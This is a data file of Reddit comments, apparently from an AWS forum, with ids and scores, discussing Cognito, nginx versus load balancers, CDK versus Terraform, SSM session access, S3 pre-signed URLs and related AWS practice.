I run one of the other solutions, Antivirus for Amazon S3, that you must have seen on AWS Marketplace. Not here to spam you, but just to add that if you are looking for a UI that drives the environment, spun up utilizing Fargate containers and is the simplest and most efficient to run, you should check our free trial out ([https://aws.amazon.com/marketplace/pp/B089QBV2GC](https://aws.amazon.com/marketplace/pp/B089QBV2GC)).

Either way, I'm happy to answer questions on whatever implementation you go with. So if you've got questions on how to pull it off or how we went about building something, I'm happy to answer them for you. I'm open to helping you stand up what you want and how you want (with or without our solution).

Thanks and good luck! Ed",2.0
g898kxy,j1jk7u,Hi Ed!  Love your product!  We were looking for a long time until we found you.  Thanks!,1.0
g70fhvs,j1gy2o,"cognito does has a reputation of being hard to use, but much better to use it than to do custom authentication yourself.  auth is hard to get right in general.  using cognito means you are standing on the shoulders of all the security experts at aws.  once you learn to use cognito, it'll pay off in the long run.",4.0
g71hz1w,j1gy2o,"The only downside I'm aware of is that there is no way to export your user pool away from Cognito.  If you want to back away from this service you need to do a slow migration.

Said that I think it's a great service and it can help in the heavy-lifting of the authentication mechanism. What we are currently doing is add a custom authenticator that saves outside Cognito all our users.",1.0
g72bakv,j1gy2o,Don't roll your own encryption or authentication. It's difficult to get right and other people who focus entirely on security have already solved the problem.,1.0
g72q6bs,j1gy2o,So you are thinking cognito is the move?,1.0
g73aepf,j1gy2o,"Personally I haven’t used cognito so I don’t feel qualified to weigh in on that, but during my infosec classes I was always taught not to roll your own encryption or authentication. That doesn’t mean using authentication middleware in express or django or something, if that’s what you mean by handling it yourself, but I was taught not to start from scratch when there are tried and tested options by security experts.",2.0
g73gaso,j1gy2o,"Perfect, appreciate your input",1.0
g70rk27,j1g4c5,"You can customize an AMI / EC2 userdata script to add users and set their passwords. There are security implications of doing so that you should be aware of when doing this (public ami = everyone knows your passwords. And most IAM principals in a given org would probably be able to read the userdata and recover passwords).  


If you're looking for the least-lift possible maybe some SSM: run command jobs for your windows servers that will set the username/pass to be what you want, and store the password securely in SSM: parameter store.

&amp;#x200B;

Hope this helps,",1.0
g75k0fh,j1g4c5,"Yes that is possible, if you register the Windows instance to a Domain. You can login using Active Domain Credential.

&amp;#x200B;

You can following this guide to configure your EC2 joining a Domain

[https://aws.amazon.com/blogs/security/how-to-configure-your-ec2-instances-to-automatically-join-a-microsoft-active-directory-domain/](https://aws.amazon.com/blogs/security/how-to-configure-your-ec2-instances-to-automatically-join-a-microsoft-active-directory-domain/)",1.0
g83fa54,j1g4c5,"Thanks guys. But i'm normally a linux guy. So this goes beyond my skillset. Any guides to a simple tutorial? Just need same password on all.
Launching a lot of servers and the time spend. setting up and connecting to RDP is just crazy.",1.0
g7035vm,j1mcae,"Hm as I understand it the linked tutorial is not creating a web-server nor a database but just a VPC (virtual private network). So if you haven't followed any other steps I think you haven't created an actual web-server yet.

Uh, though if you followed https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/TUT_WebAppWithRDS.html and have completed https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_Tutorials.WebServerDB.CreateWebServer.html on the last page on the very bottom in step 9 it's showing how to connect/test your server via the browser",1.0
g7047jf,j1m1l7,"&gt;**Can't load 2gb PDF file**

2GB pdf file?

Like 2 GIGA-BYTES?

Are you serious about trying to open a 2GB file through a web browser?

Please tell me I misunderstood your question or that you made a typo and meant 2 MB like mega-bytes?",9.0
g705he4,j1m1l7,"Yeah... two ""giga-bytes"". I have a client, they have HUGE pdfs. What's interesting is that it loads fine if the file is locally hosted (on computer) and/or opened directly in the browser. It just seems to fail when it loads the pdf from s3.",0.0
g7083z8,j1m1l7,"In all seriousness, you should provide a download link for that kind of file size. Honestly, with internet connections being unpredictable and easily interrupted,  anything of that size should be zipped and ideally handled through FTP downloads, etc.",4.0
g70cofd,j1m1l7,"It's a VueJS frontend, the upload goes right to s3. It works fine up to the 5Gb max. There IS a download link next to the preview embedded object.",1.0
g707i4l,j1m1l7,give it an hour to download and it should load fine,2.0
g70cqj1,j1m1l7,"Hah, actually it doesn't take too long. Everyone using it was able to download the file in just a few minutes. They've got fast internet.",1.0
g70dpp0,j1m1l7,"And I can't carry 200 pounds of anything in my front pocket, probably due to the fact the front pockets aren't intended to handle anything neatly that large.",5.0
g7075t3,j1m1l7,what on earth is in a 2gb pdf?,3.0
g70cs7l,j1m1l7,"Large report files. I can't share exact details. There are photos in it, but it's mostly text.. if you can believe that...",2.0
g70e8g6,j1m1l7,man talk about big.,1.0
g70l0lo,j1m1l7,"unless that text is images of scanned pages I find it very hard to believe, you'd be talking one report with over half a million pages of character text  
there's a lot of optimization that could be done there and honestly fixing that might resolve this loading problem, that said I don't think this is specifically an S3 issue, but maybe try pulling it through cloudfront instead of directly off s3",1.0
g70l7bx,j1m1l7,"I considered this, I will explore cloudfront some more. We've got it setup already anyway.",1.0
g70a1w6,j1m1l7,probably video.,1.0
g70bclz,j1m1l7,lol,1.0
g70cucu,j1m1l7,A video would be easier!!,1.0
g70mtph,j1m1l7,"Unless it was part of a course.

I experimented with putting a video in a story on PDF. Never did much myself.",1.0
g709rrh,j1lpto,*heavy breathing* I need to put a reminder for this!,10.0
g70oqkp,j1lpto,"This is nice, I feel like I'm missing the boat on something big with CDK (I'm still big into terraform). I need to get learnt.",9.0
g70ynn8,j1lpto,"I use pulumi, its based on TF (mostly) I'd choose pulumi over CDK. Its really good, same ""real code"" approach. They now have cdktf also which is a similar tool as pulumi which is probably worth the look into over cloudformation based cdk",2.0
g70r5vq,j1lpto,It’s not worth the hype imo. Still just cloud formation under the scenes with all the faults. It’s very easy to write yourself into a tangled mess with it too.,-6.0
g70rk6z,j1lpto,"It's also easy to deliberately and logically structure your app, too. But yes, CFn under the hood... with some gaps remaining to be implemented.",5.0
g711zt8,j1lpto,Will the sessions get recorded?,5.0
g70fpbm,j1lpto,Now that’s what I am talking about,3.0
g7198y7,j1lpto,Every time I see CDK stuff here I’m reminded just how bad CFn is and how much better terraform is.,3.0
g73ctxr,j1lpto,"As far as I know, Terraform can't be used as infrastructure as code, so they can't be compared.",0.0
g73qef7,j1lpto,That is like the one thing it can be used for?,1.0
g73wras,j1lpto,"Oh, I mean that with Terraform you write a static config file, but CDK offers classes to build this configuration using code. But again, I may be mistaken since I never used Terraform before.",1.0
g75a801,j1lpto,"Its a dsl. Not all languages have the same constructs. 

Do you also prefer stored procedures to sql?",2.0
g75la9a,j1lpto,"This is the correct answer. The CDK is a hammer looking for nails, and the fact that it’s basically a cloud formation wrapper instantly makes it not usable in a business scenario, IMO, for anything substantial.

Terraform (HCL) is a domain specific language built for describing elements behind an API. It’s 0.12.x+ syntax takes on coding like syntax, even.

There is no comparison between the two tools in effectiveness.

Combine your AWS provider with Postgres/mysql, new relic/splunk/datadog, GitHub, etc providers and literally describe in nuance your entire software lifecycle, and intertwine the references between your providers, like plugging in attributes from an AWS resource into a datadog resource with the ease of key = value. Anything with an API and a TF provider is wide open to describe.

HCL is much better at describing things than a coding or scripting language, and it’s dizzyingly integrative approach puts it light years ahead of anything cloudformation based.",2.0
g75b131,j1lpto,"The CDK classes are very convenient for a number of reasons:
- they allow me to use the same language as the application itself, lowering the learning curve a little bit
- since it's code, we can use any linting, formatting or typehinting tools. It's almost impossible to break something...
- you have all the power that code gives you to create reusable bits of infrastructure: factories, plain methods, packages...
- you could even mix the infra code with your application code, statically typing external code dependencies such as environment variables for queues, database, etc.",1.0
g74a36l,j1lpto,You’re not mistaken,1.0
g75kq29,j1lpto,"Definitely not the one thing. It’s a generic API broker. It can broker anything behind an API, infrastructure or not.",1.0
g71zuxx,j1lpto,This is very important!,1.0
g71n391,j1lpto,"CFN all the way!
CDK is nice but I do still prefer troposphere for python usage.",1.0
g70gfoo,j1lpto,"Eventbrite, really? They couldn't build out a registration site with CDK? /snicker  Sigh, signed up anyway.",-2.0
g705l11,j1f3cp,Does the container run in AWS?,2.0
g70icl7,j1f3cp,"For now yes, but the final plan is for it to run on the remote machine. I want to avoid having the credentials file on there or in Dockerfile in the git repo.",1.0
g72l66b,j1f3cp,And this remote machine will NOT live within AWS I am guessing?,1.0
g72q96i,j1f3cp,"The machine is connected to the aws by VPN, but the machine itself is not an EC2 instance.",1.0
g80di11,j1f3cp,You may be able to leverage Hybrid Activations via Systems Manager.  Might at least be worth exploring: [https://docs.aws.amazon.com/systems-manager/latest/userguide/activations.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/activations.html),1.0
g80jw9d,j1f3cp,"Thanks, I'll take a look. Thinking about it what I actually need, isn't actually IAM roles, I'm trying to avoid keeping AWS credentials on the machine. After looking at [this](https://aws.amazon.com/premiumsupport/knowledge-center/s3-private-connection-no-authentication/) article, I might go with VPC.",1.0
g702kud,j1f3cp,"You should create a IAM user with permission to perform an assume role on your role and the link with the source profile. https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html

This way the CLI uses the credentials to perform the assume role. I know it’s ugly as hell but the only alternative is to use your local credentials to perform the assume role and inject the short-lived credentials in the container.",1.0
g70jhew,j1f3cp,"I don't have aws cli installed and would rather avoid it I can. I've found some staff on stackoverflow, going to try it out, and keep cli as a backup option.",1.0
g6zwhbc,j1j9yk,I'm waiting for the critical responses about the limitations of workspaces.,4.0
g70iecj,j1j9yk,"As long as you don’t try to access them from across the globe, they’re not bad",3.0
g70anna,j1ecdy,From what I have seen so far the account-wide setting takes precedence.,2.0
g700zmt,j1f6ux,"lambda itself only ever has one thread running inside a given container, which has its own memory, so unless you are doing your own multithreading/multiprocessing they wont interfere",4.0
g717vtq,j1f6ux,"ACK. Your existing lambda runtime only runs on invocation at a time. So it is safe to declare things globally to safe on invocation time, if your lambda instance is still running and will process new requests. If there is a parallel need because of the requests, Lambda will start more instances (Firecracker VMs) running it.",1.0
g6yzn3g,j1f6ux,"actually, I _think_ it's thread safe once the Resource itself is created. Can you show some references for this?

I am pretty sure some of our code shares DynamoDB TableResources across threads, but I won't swear to that. I'd be interested to find some up-to-date documentation on this for sure.",1.0
g6zgclq,j1f6ux,"Here is a link to the docs:

https://boto3.amazonaws.com/v1/documentation/api/latest/guide/resources.html?highlight=multithreading#multithreading-multiprocessing

I'm not sure what the implications of this are for Lambda though. I'm worried I may have being doing it wrong this whole time.",2.0
g6ytns4,j1f6uj,"It can, but some application servers may not perform as well when listening directly on the network because of how it handles connections. I saw a case with a customer a few years ago where their Python application performed poorly when its port was directly accessed by the ELB. Putting nginx in each container as a local proxy worked really well and did not really increase the load or cost.

This depends on each application server, so please test. I can't recall exactly which one had the issue, but they probably fixed it.",34.0
g6z26n4,j1f6uj,"I don't doubt what you say, but I struggle to find a technical reason for why that would happen",28.0
g6z8s94,j1f6uj,Could be nginx + wsgi using multiple processes vs one single python process blocking on the GLI? The container might not look heavily loaded but will have high latency because of the lock conflict.,24.0
g6zoaww,j1f6uj,This sounds exactly right. Serving a python app without wsgi is not performant and not intended for production workloads.,12.0
g708dyl,j1f6uj,"Yeah bingo, the GIL can really fuck you without multiple processes",2.0
g6zat53,j1f6uj,"This is my theory, but a lot of people just use the built-in webserver in python app, which is meant just for debugging.

Alternatively or if they use gunicorn or uWSGI, then perhaps misconfigured it for example using http-socket (meaning an http load balancer should be in front) instead of http (serving directly). uWSGI is especially confusing with millions of its options.",9.0
g7h2lxv,j1f6uj,"One example is NodeJS. It has compression, but it’s not very good at it. If you front it with Nginx and let it handle the compression, it’s much faster and you can gain higher throughput.",1.0
g6yy4cm,j1f6uj,An event loop setup out of the box (like node.js) will happily accept connections until your app falls over. You can use NGINX to queue requests more efficiently to create a more durable setup,5.0
g6z91zc,j1f6uj,"did that customer used gunicorn or uwsgi to run the app, or did they just do `app.run()`?",2.0
g6zofzy,j1f6uj,"It was with gunicorn. From the [deployment docs](https://docs.gunicorn.org/en/stable/deploy.html):

&gt; We strongly recommend to use Gunicorn behind a proxy server.
&gt; ...
&gt; ... you need to make sure that it buffers slow clients when you use default Gunicorn workers. Without this buffering Gunicorn will be easily susceptible to denial-of-service attacks.",2.0
g6yva10,j1f6uj,Makes a lot of sense. Probably will do. Would you suggest putting NGINX on its own server in between the app server and ELB or just have NGINX on the App server? Was reading that separating NGINX from the app server would just cause delays,2.0
g6yxeo5,j1f6uj,You don't need nginx on it's own server. Just install it on the app server.,9.0
g6yxs4t,j1f6uj,I am also wondering if it would make sense to have one nginx instance per app server or one for all of them?,1.0
g6z0bl6,j1f6uj,"To be more clear, you don't need nginx on separate EC2 instances. In the case I mentioned, performance was better when nginx was run on the same EC2 instance as the applications.

On an individual EC2 instance, if you run multiple web applications you can definitely run one instance of nginx to route traffic to the different applications by virtual host or URI path or other options.

If you are running containerized applications, it's easier to manage if you put nginx in each task or pod or as a sidecar container in each task or pod.",8.0
g6yz7w9,j1f6uj,"NGINX can also add/rewrite security headers which may help improve application security, which ALB doesn't do, e.g.

    X-Frame-Options: SAMEORIGIN
    X-Content-Type-Options: nosniff
    X-XSS-Protection: 1; mode=block
    Referrer-Policy: strict-origin-when-cross-origin
    Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",6.0
g6yw5aa,j1f6uj,"In most cases the ALB or NLB will be enough.

If it is just for load balancing I would recommend the NLB.

If you need to consider request info to send to other ""target groups"" or you need a integration for authentication like Cognito, I would recommend ALB.

If you need to use a NGINX I would recommend to make it as an Auto-Scaling Group and place it behind an NLB.

[https://docs.nginx.com/nginx/deployment-guides/amazon-web-services/high-availability-network-load-balancer/](https://docs.nginx.com/nginx/deployment-guides/amazon-web-services/high-availability-network-load-balancer/)",9.0
g6ys1et,j1f6uj,yeah most likely,9.0
g6yu9vf,j1f6uj,"It removes the need but not the potential desire -- one potential downside is that you lose the ability to do any custom routing within nginx without needing to hit the app (e.g. maybe you want to serve static files if one route is hit but pass to your WSGI socket if it hits another), or you might want to block a bad actor (if you don't have CF or WAF deployed) and can't do so without a server you can manipulate somewhere in the chain (that last one is a stretch, admittedly).

Nginx offers a lot of flexibility in traffic shaping too; your app is at the mercy of your traffic volume with no mitigation in the middle with just an ALB but nginx can offer some throttling/rate control to ensure that a mountain of traffic gets dropped by nginx and doesn't choke out your app.",9.0
g6zboyu,j1f6uj,\*lb does support some basic custom routing. As with most aws things great until you start wanting lots of customization then you usually have to start replacing / working around it.,7.0
g6zdqyt,j1f6uj,"Thankfully you commented. If you're seeing this, please note you can do quite a bit of custom routing in ALB. Your requirements must be quite outlandish to have to need to use a custom proxy solution outside of ALB.",7.0
g6zgaqs,j1f6uj,yea doesn't seem like many of these folks have actual aws experience or know how to read docs..,4.0
g6yv7jp,j1f6uj,"Yeah it's definitely one of those ""rather have it and not need it"" kind of things!",3.0
g6zdt6v,j1f6uj,"Conversely, your nginx machine now becomes the bottleneck. Everything is a trade-off though and you should choose what's best or your circumstances.",3.0
g6zw277,j1f6uj,You can't do path rewriting with alb sadly. Otherwise I could have a readable url for AWS es's kibana :(,2.0
g77t6y7,j1f6uj,I have little experience with it but isn't it possible to do that with Lamda@Edge?,1.0
g6ysh1c,j1f6uj,Depends on your nginx conf but if you only need a SSL terminator and load balancing then an ALB will suffice.,10.0
g6yvsf1,j1f6uj,well there's also https://aws.amazon.com/elasticloadbalancing/pricing/ to consider.. at large scale you probably want to reduce ELB cost.,3.0
g6z6x6g,j1f6uj,"There's a couple situations where i see nginx use. First is static assets - app servers are relatively expensive to serve them.  You should be using cdn+s3, but if you must serve static assets it can help.  Second big reason is slow clients - ALBs do not buffer where nginx does, so if a client is downloading a request really slowly it's tying up a thread that could be serving other requests when it could just be using a cheap nginx connection.  similarly if you compress responses, nginx compression is cheaper than rails or python.",3.0
g6z9kem,j1f6uj,"Interestingly, I have found that offloading assets to a CDN purely to free up CPU on a server has almost no effect since serving, for example, PNG files costs almost 0 compared to executing a PHP process that reads from MySQL.  Still, we push assets off to a CDN so that clients worldwide get a better experience.

Edit: We benchmarked a micro instance running lighttpd and it was able to serve a 25k HTML file (compressed and cached by lighttpd) 300,000 times in one minute using loader.io.  Load average never got above .75 during that minute.",1.0
g6zyjhs,j1f6uj,"i admittedly have never actually benchmarked this, so it may be outdated advice.  i think its mostly relevant in ruby/python because they tend to have relatively few threads. so its less about cpu cycles themselves, since its basically just moving bytes from one place to another, but by the number of threads that it takes up during that time.  cdn is mostly for  things like end user performance or being able to serve up multiple versions of assets",2.0
g6ywxkq,j1f6uj,Consider choosing the right load balancer with comparison [ALB vs Nginx](https://www.nginx.com/blog/aws-alb-vs-nginx-plus/),4.0
g6zblog,j1f6uj,"It **depends**. We use ALB in front of our Fargate deployed containers. But, we can't have unencrypted comms, even internally within our network. So, the ALB forwards the request via HTTPS to our Fargate instances. 

The task in Fargate has a nginx docker container. This container automatically configures itself with some assets from an S3 bucket (TLS certs, config, etc). The ALB sends all traffic to the nginx container over 443, the nginx acts as the reverses proxy and forwards to the application container which listens on another port. 

If we didn't care about crypto within the network, ALB could just send unencrypted to the app container.",1.0
g6zriyd,j1f6uj,If you need to do path rewrites then you still need something a little nicer than an ALB such as nginx.,1.0
g71hzrp,j1f6uj,"In the past I have ended up using an nginx or other proxy between my apps and the ALB/ELB to stop slow clients from tying up an appserver process.

In this way the appserver can pass the whole response off to nginx at once and get on serving the next request. Proxies like nginx are happy to buffer the responses until the clients have received them all.",1.0
g6ztlb6,j1f6uj,"ALB can handle path based routing and TLS termination, and obviously load balancing. If you don't need anything else, you don't need nginx. If you are using python, you really should use it with a proper WSGI server like uwsgi",0.0
g6yvjt7,j1en8h,We use AWS SSO across all accounts. Our primary directory is azure ad (office365) and integration with AWS SSO ensures a smooth setup across all accounts.,3.0
g6yvme3,j1en8h,Also look into AWS SSM to get rid of bastion hosts.,3.0
g6yxlve,j1en8h,"Thanks.

How do your employees gain access to RDS in private subnets? Do you have a VPN setup per account? From my understanding, SSM still requires a bastion host if you're trying to get a tunnel to RDS, since RDS instances don't allow SSH on their own.",1.0
g72uzq2,j1en8h,That's correct. We use a small ec2 windows host as a box to do that. We've not gone with a vpn setup yet.,1.0
g70lg8r,j1dtjr,Could you detail your workflow a little more?,1.0
g6yiowh,j1dpah,Sounds like you might be running the box out of memory or maxing out the CPU to the point it becomes unresponsive. What do the CloudWatch metrics look like?,1.0
g6yjk8j,j1dpah,I'm running my test on a 6x (8x192). CPU is maxing at 40% and memory isn't getting over 20%.,1.0
g6yr4qs,j1dpah,"&gt; No matter how long I wait

Not that what you're describing *should* happen, but how long are we talking here?",1.0
g6ysqxu,j1dpah,"The longest I've waited is probably around 12 hours.

If I configure tempdb to be on the same EBS volume as my test database, the ALTER statement completes in about 50 minutes.",1.0
g6z2s8q,j1dpah,"There's definitely a chance it's not finishing my man. I would figure out some way to view the status even without connection to the instance itself.

I don't know much about performance on your setup, but when I was a DBA with an absolute massive Oracle DB, it would take a week or two to execute this upgrade script with thousands of statements. The worst ALTER statements definitely took multiple days before we spent months optimizing them.",1.0
g6ytdc4,j1dpah,Does the Event Log start screaming warnings or errors?,1.0
g6yxqse,j1dpah,"Nothing that I think is terribly informative. The only errors I see are com failures trying to trigger the lock screen, which I assume is trying to launch after I lose connectivity to the instance. 

Before that, no errors in system or application that aren't routine. After the problem starts I'll eventually get a Win-RM error that it is no longer listening for new requests.",1.0
g6z3o3m,j1dpah,"That's interesting, usually you'd start getting warnings about dropped writes and stuff.",1.0
g6zb9ju,j1dpah,"I have noticed small EBS volumes using all of their throughput credits.

After heavy disk activity, the instance is extremely slow or unreachable.

After a few minutes or more, the instance returns to normal.

We ended up switching from general purpose GP2 volumes to provisioned IOPS volumes IO1 for some production servers.

* The throughput limit is between 128 MiB/s and 250 MiB/s, depending on the volume size.

Also EC2 instances have throughput limits.

* [Amazon EBS volume types](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-volume-types.html)
* [Amazon EBS–optimized instances](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-optimized.html)

I usually open Cloudwatch, and add all of the metrics.

Then slowly remove the metrics which are not active.

Usually, during heavy database activity, EBS volume reads and writes approach  their limits or hit their limits.

If the limit on a particular metric is maxed, it should be investigated.

Small volumes can easily hit their throughput maximum.",1.0
g6yxmzy,j1dndd,"Setup billing budget and alerts.
Setup SCP.
Setup cloud discovery and continuous monitoring,  use open source tools like Cloud Custodian or any paid third party tool",8.0
g6znwbq,j1dndd,Clean up after you are done!,6.0
g6yrpvz,j1dndd,"With (imho) the web GUI getting slower with every update, my most beloved tip found somewhere (credits to [https://stackoverflow.com/questions/34018931/how-to-view-aws-log-real-time-like-tail-f](https://stackoverflow.com/questions/34018931/how-to-view-aws-log-real-time-like-tail-f)) it has been aws cloudwatch logs tailing by ""aws logs tail --follow --since 10s"".",7.0
g6zl932,j1dndd,The newly released VS Code integration with CloudWatch is also great for this,7.0
g73ax6d,j1dndd,I guess you mean this answer  https://stackoverflow.com/a/56959236/3484824,2.0
g70qr6s,j1dndd,"If you have a web application you want to expose to the internet, don't bother with setting up an IGW on your network or public/private subnet routing. Use  HTTP api gateway with VPC link to put traffic to an LB in your VPC and put your applications behind that.

This makes a lot of assumptions, like you have no runtime dependency on connecting out to the internet for any services, but if you don't than this is a security win for a few reasons:  


\- API gateway can authenticate/authorize requests with the lambda authorizer

\-You get some some input validation, varies by the API type (rest=full openAPI schema validation, HTTP api = limit only intended paths)

\-No IGW in your VPC means that something in your VPC cannot initiate outbound connections to the internet. This effectively means nothing accidentally exposed to the internet that's in your vpc, ever.  


I need to round out the research on this topic, I'd like to really document a few patterns for it and to understand the systems a bit deeper, but this is something neat I thought worth sharing.

If you need to use ssh in the above scenario, look into SSM session manager as a replacement.",3.0
g70acap,j1dndd,"The Tag Editor (under Resource Groups) is a great way to view all* of your resources, even the ones you've forgotten about in other regions. 

\* Does not include GovCloud or China",2.0
g71orx9,j1dndd,Use AWS Solutions or Launch Wizard to deploy Workloads more easily...,1.0
g6z09li,j1d70t,"This should not be the case.  A few ideas:

&amp;#x200B;

1. Is your user pool set up to verify email addresses?
2. How is your client app updating the email address?  If you're calling [Auth.updateUserAttributes](https://aws-amplify.github.io/amplify-js/api/classes/authclass.html#updateuserattributes) and passing it the new email address for the authenticated user, Cognito should be sending a verification email (provided you've se up your User Pool to verify email addresses).  
3. How do you know Cognito is automatically verifying the email address without the code?  Log into Cognito, click on your User Pool, select 'Users and Groups"" from the left hand side.  Select the user in question and see if the ""Account status"" field is set  to CONFIRMED.",1.0
g711fud,j1d70t,User pool is set up to verify the email address and I'm using `Auth.updateUserAttributes` and Cognito sends the verification code to that email address and before verifying when I look at the cogito user list that user email is updated and already CONFIRMED and when I try verifying the email address with code Cognito says email address already verified.,1.0
g71gps2,j1d70t,"Sorry, I have resolved the issue, everything working fine now",1.0
g71yai1,j1d70t,Mind sharing the solution?  It may help people that come across the same problem in the future.,1.0
g720vng,j1d70t,The problem was with me I was confused with Account status CONFIRMED and email_verified,1.0
g6yffs5,j1d515,"Use the root account, you'll need access to the email you provided when you vended the account.",3.0
g6yjwks,j1d515,"You're right. The account assigned through SSO has no permissions. Strange default, but whatever.",1.0
g6yu8yn,j1d515,"I don't think that's the default. In my organization, we almost never use the root account for accounts created by Control Tower. Check to see if you have any guardrails or Organizations-level security control policies in place. Those would supersede your admin permissions.",2.0
g6ywgy7,j1cdkr,Don't know about Google but generally if you're able to set your NS records to point to google from AWS then you can set the rest (MX etc) at Google,1.0
g6z9wz9,j1cdkr,"My thinking as well but the Google Domains interface doesn't seem to let me ""add"" a new domain without transferring the whole domain.",1.0
g6yb3li,j1c20c,"AZs are physically separate, but within 100km of each other ([as described here](https://aws.amazon.com/about-aws/global-infrastructure/regions_az/)) . 100km is about 0.3 millisecond at the speed of light. It might not be ""immediately"" but it is as close to ""immediately"" as makes no difference to us impatient human beings.",17.0
g6ydg8m,j1c20c,"and to add to that, SGs are pretty small in the grand scheme of configurations, if they're anything like IPsets or IPTables then what gets pushed is gonna be smaller than a couple KB",6.0
g6ybbgq,j1c20c,"Changes dont affect already established conns btw, the connections must close",4.0
g6yyve7,j1c20c,"Not true. If you remove a rule that allows RDP while you're RDP'd to an instance, the session will disconnect",1.0
g6z7vg3,j1c20c,"Only if the connection wasn't tracked. If it's a tracked connection, it will not be dropped.",5.0
g70eg4p,j1c20c,What's tracked connection?,1.0
g70yaur,j1c20c,https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-security-groups.html#security-group-connection-tracking,3.0
g721erx,j1c20c,"VPC is one of those services that's so transparent that one tends to forget that it's one of AWS's most brilliantly implemented services.

When AWS developed VPC, they had a set of requirements in mind, including multi-tenancy and speed. A traditional set of firewalls, core switches, etc wasn't an option due to scalability limitations, operational expense, and speed of updates. It's crucial to remember that VPC is not backed by Cisco VXLAN technology (or equivalent), but instead is software defined. Note that the below explanation dances around what's in the public domain, but nothing stated is under NDA.

As with all AWS services, VPC is composed of many internal services that the customer does not see. Among these services is a region-specific registry of VPC metadata and configuration. This registry includes security group definitions. Think of this registry like a set of DynamoDB tables, in that it is replicated to all availability zones within a region.

Now, when you make an update to a security group, it updates the VPC metadata registry. In the same way that DynamoDB updates and S3 updates are fast, so too are the VPC metadata registry updates. But then what about affecting actual network traffic? Well, this is where the next phase of the update comes in.

Running on each physical host is a cache of the VPC metadata registry, but only containing entries relevant to the instances running on those hosts. So, when you make a security group update, it may only affect the registry, or it may also affect the caches on any number of hosts. The update is actually eventually consistent while all of the caches are updated, but for all intents and purposes, it tends to appear instant.

There's a lot more to VPC and how the traffic flow actually works, but the reason for the apparent immediate application of security group changes is simply that there are far fewer updates being made than one may realize.",1.0
g6yl45q,j1bwy2,Keep the RDS private and use a bastion host. Whitelist ingress from the bastion on your RDS cluster’s security group. Ideally you could also limit the scope of allowed ingress on your bastion to only your build system/office.,2.0
g6yp8ea,j1bwy2,"I have the same setup. I gain access to the aws account locally using 2fa, then run migrations on the db I need to.

This is because we decouple our migrations from app code rollouts, if you want to migrate before a deployment, you can setup an IAM user with permissions to run commands on your app servers (ECS, EKS etc.) then give your CI server the keys to run the migration.",2.0
g6yhgq5,j1bjty,"Only big gotcha is that it CAN work in isolated subnets (subnets that don’t have an IGW or NAT access) but it requires multiple AWS PrivateLink resources to be spun up, and each privatelink resource has an hourly charge. 

Another good thing to note is that Red Hat instances don’t come with the SSM agent pre-installed, so you’ll need to standardize some user data / setup a golden AMI that includes it, if that applies to you. 

Other than that, SessionManager has been great and it’s probably my preferred way to access EC2 resources since it also comes with full session logging.",3.0
g6yo2my,j1bjty,Thanks. This is very helpful.,1.0
g6y5aue,j1ax6u,Don’t use IAM users for end user accounts. Take a look at Cognito.,6.0
g6yirrf,j1ax6u,"I'm currently solving a similar problem in a serverless app I'm building.

I'm using Cognito to manage user accounts (sign in, sign out, password reset, etc).  Once authenticated, users can select a profile picture, which I store in S3.  


I use Amplify to communicate with Cognito *and* S3.  Each user has an IAM role that dictates what they can do in my application.  This lets me define IAM policies that dictate what users of my application are allowed to do.  


I communicate with Cognito and S3 using Amplify in my front end (React), which I understand is a pretty common use case.",3.0
g6yturu,j1ax6u,"I have user management set-up using JWT and backend database, so that part is solved.

OK, tnx, will take a look at Amplify then :)",1.0
g6z1l8f,j1ax6u,"You certainly don't *need* to use Amplify, but I've found it pretty easy to work with.  I think the takeaway from my experience is that IAM is going to be the best way to implement authorization throughout your app, regardless of how your client application is communicating with S3.

In my application, I am defining two IAM roles that will apply to all users in my application.  All users will be assigned an authenticated *or* unauthenticated IAM roles.  The unauthenticated role defines an IAM policy that provides read only access to some S3 buckets, a few API endpoints, DynamoDB, etc.  The authenticated IAM role will give the user the ability to upload to S3, mutate state in DynamoDB (via an API call), etc.  In the future, I may support additional IAM roles for authenticated users to give additional permissions, but two should fit my needs for now.

Creating IAM roles in my application lets me broadly categorize users into groups, and I can define permissions on the groups with IAM policies. Your question implied that you' be creating IAM policies on a per user basis.  While this may be possible, it's probably not necessary.

Good luck!",2.0
g6zw54k,j1ax6u,"What did you mean by ""You certainly don't *need* to use Amplify""? What would be alternative solution, using aws-sdk/global and aws-sdk/clients/s3?

From my current standpoint, I will certainly need IAM, because although in the first phase each user will have access exclusively to his own files, we plan to introduce concept of user groups and file sharing in the future. Do you, by any chance, have some guides/tutorials to IAM, except official AWS docs?

Sorry if I ask numb questions, I'm still very fresh in this AWS universe :)",1.0
g72js9l,j1ax6u,"I just meant that Amplify isn't the only SDK that will get you access to S3.  However, I've found it quite easy to work with and would recommend giving it a shot.",1.0
g7pqpr5,j1ax6u,"Actually, I found plain aws-sdk library (more precisely aws-sdk/clients/s3) simple to use and satisfying for my needs. At least for now :)

[Here](https://docs.aws.amazon.com/code-samples/latest/catalog/typescript-s3-controller.ts.html) is a good starting point to get it going with Angular...",1.0
g6z0hsl,j1ax6u,"Another option is to use pre-signed URLs for S3. When you need to upload - ask backend to generate pre-signed URL to PUT new file to S3 and upload it directly via browser. When you need to download a file - ask backend to generate pre-signed URL for GET and give it to the user to download the file.  All the logic about who can download the file can be managed on the backend, for example store some metadata information about the owner in the database.

Here is the article about pre-signed URLs: https://docs.aws.amazon.com/AmazonS3/latest/dev/ShareObjectPreSignedURL.html",2.0
g6y1e6h,j1aluk,"You can! Check out: https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.Connecting.html

Second half of the page has a play by play on how to do this manually.",1.0
g6y7o0k,j1aluk,"Depending on your lambda function and the frequency of calling RDS, do check out RDS proxy as well to pool your authentication pool - https://aws.amazon.com/blogs/compute/using-amazon-rds-proxy-with-aws-lambda/",1.0
g6ye3xt,j1abon,"According to the docs, Lambdas have max timeout of 15mins + max 3008MB allocated memory (https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html), so not sure how you're able to guarantee that your daily job can stay within these limits.


